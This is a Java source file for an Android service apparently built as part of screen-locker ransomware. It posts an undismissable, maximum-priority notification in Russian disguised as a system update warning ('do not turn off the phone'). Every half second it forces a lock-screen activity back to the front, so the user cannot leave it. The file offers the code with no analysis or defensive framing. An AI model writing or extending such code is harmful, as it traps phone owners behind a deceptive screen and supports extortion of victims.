package com.example.locker;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

public class LockerService extends Service {
    private static final String CHANNEL_ID = "LockerChannel";
    private static final int NOTIF_ID = 1234;
    private Handler handler = new Handler();

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, getNotification());

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isActivityActive()) {
                    Intent intent = new Intent(LockerService.this, LockScreenActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
                handler.postDelayed(this, 500);
            }
        }, 500);
    }

    private boolean isActivityActive() {
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningTaskInfo task : am.getRunningTasks(10)) {
            if (task.topActivity != null && task.topActivity.getClassName().equals(LockScreenActivity.class.getName())) {
                return true;
            }
        }
        return false;
    }

    private Notification getNotification() {
        Intent notificationIntent = new Intent(this, LockScreenActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Системное обновление")
                .setContentText("Установка обновления... не выключайте телефон")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Locker Service",
                    NotificationManager.IMPORTANCE_HIGH
            );
            channel.setDescription("Служба блокировки экрана");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}